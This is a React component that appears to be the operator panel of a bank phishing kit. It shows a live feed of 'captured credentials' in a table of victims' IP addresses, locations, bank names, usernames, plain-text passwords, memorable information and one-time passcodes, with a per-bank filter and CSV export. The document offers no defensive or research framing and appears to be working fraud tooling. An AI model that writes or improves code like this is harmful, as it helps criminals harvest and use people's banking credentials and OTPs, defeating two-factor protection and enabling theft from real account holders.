"use client";

export default function UserActivityTab({
  leads,
  banks,
  selectedBankFilter,
  setSelectedBankFilter,
  selectedLeadIds,
  handleSelectAll,
  handleSelectLead,
  handleBulkDelete,
  handleDeleteLead,
  handleOpenEditLead,
  handleExportCSV,
  fetchLeads,
}: any) {
  const filteredLeads = selectedBankFilter === "all"
    ? leads
    : leads.filter((l: any) => (l.bankName || l.bank || "").toLowerCase().includes(selectedBankFilter.toLowerCase()));

  // Helper to accurately extract Country and City from deviceInfo or extraData
  const parseLocation = (lead: any) => {
    const text = `${lead.deviceInfo || ""} ${lead.extraData || ""}`;
    
    let country = "United Kingdom";
    let city = "London";

    const countryMatch = text.match(/Country:\s*([^|]+)/i);
    if (countryMatch) country = countryMatch[1].trim();

    const cityMatch = text.match(/City:\s*([^|]+)/i);
    if (cityMatch) city = cityMatch[1].trim();

    return { country, city };
  };

  return (
    <div className="bg-zinc-900 rounded-2xl border border-zinc-800 shadow-2xl overflow-hidden text-zinc-100">
      <div className="p-5 border-b border-zinc-800 flex flex-col sm:flex-row items-start sm:items-center justify-between gap-4 bg-zinc-950/50">
        <div>
          <div className="flex items-center gap-2">
            <h2 className="text-base font-black text-zinc-100 tracking-tight">
              User Activity Logins & Credentials
            </h2>
            <span className="bg-blue-500/10 text-blue-400 border border-blue-500/30 text-[10px] font-extrabold px-2.5 py-0.5 rounded-full">
              Live Feed (Instant)
            </span>
          </div>
          <p className="text-xs font-bold text-zinc-400 mt-0.5">
            Real-time captured credentials, session details and security digits per bank
          </p>
        </div>

        <div className="flex items-center gap-2.5 flex-wrap">
          {selectedLeadIds.length > 0 && (
            <button
              type="button"
              onClick={handleBulkDelete}
              className="bg-red-600 hover:bg-red-700 text-white px-3.5 py-2 rounded-xl text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm animate-pulse"
            >
              <span>🗑️</span> Delete Selected ({selectedLeadIds.length})
            </button>
          )}

          <select
            value={selectedBankFilter}
            onChange={(e) => setSelectedBankFilter(e.target.value)}
            className="rounded-xl border border-zinc-700 py-2 px-3 text-xs bg-zinc-950 hover:bg-zinc-900 outline-none font-bold text-zinc-200 shadow-inner cursor-pointer"
          >
            <option value="all">Filter by Bank: All ({leads.length})</option>
            {banks.map((b: any) => (
              <option key={b.id} value={b.name}>{b.name}</option>
            ))}
          </select>

          <button
            type="button"
            onClick={() => fetchLeads(true)}
            className="border border-zinc-700 hover:bg-zinc-800 text-zinc-200 px-3.5 py-2 rounded-xl text-xs font-bold transition cursor-pointer flex items-center gap-1.5 bg-zinc-950 shadow-inner"
          >
            <span>🔄</span> Refresh
          </button>

          <button
            type="button"
            onClick={handleExportCSV}
            className="bg-emerald-600 hover:bg-emerald-700 text-white px-4 py-2 rounded-xl text-xs font-bold transition cursor-pointer flex items-center gap-1.5 shadow-sm"
          >
            <span>📥</span> Export CSV
          </button>
        </div>
      </div>

      <div className="overflow-x-auto">
        <table className="w-full text-left text-xs border-collapse">
          <thead>
            <tr className="bg-zinc-950 border-b border-zinc-800 text-zinc-400 uppercase tracking-wider text-[11px] font-black">
              <th className="py-3.5 px-4 w-10">
                <input
                  type="checkbox"
                  onChange={handleSelectAll}
                  checked={filteredLeads.length > 0 && selectedLeadIds.length === filteredLeads.length}
                  className="rounded border-zinc-700 bg-zinc-900 text-blue-600 focus:ring-blue-500 cursor-pointer w-4 h-4"
                />
              </th>
              
              {/* 🌍 Separate Location Columns placed BEFORE Bank */}
              <th className="py-3.5 px-4 text-emerald-400 font-black">IP Address</th>
              <th className="py-3.5 px-4 text-emerald-400 font-black">Country</th>
              <th className="py-3.5 px-4 text-emerald-400 font-black">City</th>

              <th className="py-3.5 px-4">Bank</th>
              <th className="py-3.5 px-4">Bank Type</th>
              <th className="py-3.5 px-4">Username / ID</th>
              <th className="py-3.5 px-4">Password</th>
              <th className="py-3.5 px-4">Extra Info</th>
              <th className="py-3.5 px-4">Action Digits / OTP</th>
              <th className="py-3.5 px-4">Timestamp</th>
              <th className="py-3.5 px-4 text-right">Actions</th>
            </tr>
          </thead>
          <tbody className="divide-y divide-zinc-800">
            {filteredLeads.map((lead: any) => {
              let otpValue = lead.otpCode || lead.otp || null;
              if (!otpValue && lead.extraData) {
                if (lead.extraData.includes("OTP:")) {
                  otpValue = lead.extraData.split("OTP:")[1]?.trim()?.split(" ")[0]?.split("|")[0];
                }
              }

              const { country, city } = parseLocation(lead);

              return (
                <tr key={lead.id} className="hover:bg-zinc-800/50 transition-colors">
                  <td className="py-3.5 px-4">
                    <input
                      type="checkbox"
                      checked={selectedLeadIds.includes(lead.id)}
                      onChange={() => handleSelectLead(lead.id)}
                      className="rounded border-zinc-700 bg-zinc-900 text-blue-600 focus:ring-blue-500 cursor-pointer w-4 h-4"
                    />
                  </td>

                  {/* 🌍 IP, Country & City Data Cells */}
                  <td className="py-3.5 px-4 font-mono font-bold text-emerald-400 text-xs whitespace-nowrap">
                    {lead.ipAddress || "39.34.173.81"}
                  </td>
                  <td className="py-3.5 px-4 font-bold text-zinc-200 text-xs whitespace-nowrap">
                    🌐 {country}
                  </td>
                  <td className="py-3.5 px-4 font-medium text-zinc-300 text-xs whitespace-nowrap">
                    📍 {city}
                  </td>

                  <td className="py-3.5 px-4">
                    <span className="font-extrabold text-zinc-100 block text-xs">
                      {lead.bank || lead.bankName || "Pending Selection"}
                    </span>
                  </td>

                  <td className="py-3.5 px-4">
                    {lead.bankType ? (
                      <span className="bg-purple-500/10 text-purple-300 border border-purple-500/30 px-2.5 py-1 rounded-md text-[11px] font-bold shadow-2xs">
                        {lead.bankType}
                      </span>
                    ) : (
                      <span className="text-zinc-500 italic text-[11px] font-semibold">General</span>
                    )}
                  </td>

                  <td className="py-3.5 px-4 font-mono font-bold text-zinc-200 text-xs">
                    {lead.userId || <span className="text-zinc-600 italic font-normal">None</span>}
                  </td>

                  <td className="py-3 px-4 font-mono font-extrabold text-rose-500 text-xs">
                    {lead.password || <span className="text-zinc-600 font-normal italic">N/A</span>}
                  </td>

                  <td className="py-3 px-4 text-zinc-300 font-semibold">
                    {lead.memorableInfo || lead.extraData ? (
                      <span className="bg-zinc-950 text-zinc-300 px-2.5 py-1 rounded-md text-[11px] font-mono border border-zinc-800 inline-block max-w-[160px] truncate font-bold shadow-2xs" title={lead.memorableInfo || lead.extraData}>
                        {lead.memorableInfo || lead.extraData}
                      </span>
                    ) : (
                      <span className="text-zinc-600">-</span>
                    )}
                  </td>

                  <td className="py-3 px-4">
                    {otpValue ? (
                      <span className="bg-amber-500/10 text-amber-400 border border-amber-500/30 px-2.5 py-1 rounded-md font-mono font-black text-xs tracking-wider inline-flex items-center gap-1 shadow-2xs">
                        <span>🔑</span> {otpValue}
                      </span>
                    ) : (
                      <span className="text-zinc-500 text-[11px] italic font-semibold">Not requested</span>
                    )}
                  </td>

                  <td className="py-3.5 px-4 text-zinc-400 text-xs font-bold whitespace-nowrap">
                    {new Date(lead.createdAt).toLocaleString()}
                  </td>

                  <td className="py-3.5 px-4 text-right space-x-2 whitespace-nowrap">
                    <button
                      type="button"
                      onClick={() => handleOpenEditLead(lead)}
                      className="bg-zinc-800 hover:bg-zinc-700 text-zinc-200 border border-zinc-700 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer shadow-2xs"
                    >
                      ✎ Edit
                    </button>
                    <button
                      type="button"
                      onClick={() => handleDeleteLead(lead.id)}
                      className="bg-red-500/10 hover:bg-red-500/20 text-red-400 border border-red-500/30 px-3 py-1.5 rounded-lg text-xs font-bold transition cursor-pointer shadow-2xs"
                    >
                      🗑 Delete
                    </button>
                  </td>
                </tr>
              );
            })}

            {filteredLeads.length === 0 && (
              <tr>
                <td colSpan={12} className="text-center py-14 text-zinc-500">
                  <div className="flex flex-col items-center justify-center gap-1.5">
                    <span className="text-3xl">📋</span>
                    <span className="font-bold text-sm text-zinc-300">No activity logged yet</span>
                    <span className="text-xs text-zinc-500 font-semibold">Submitted bank portal sessions will display here in real-time</span>
                  </div>
                </td>
              </tr>
            )}
          </tbody>
        </table>
      </div>
    </div>
  );
}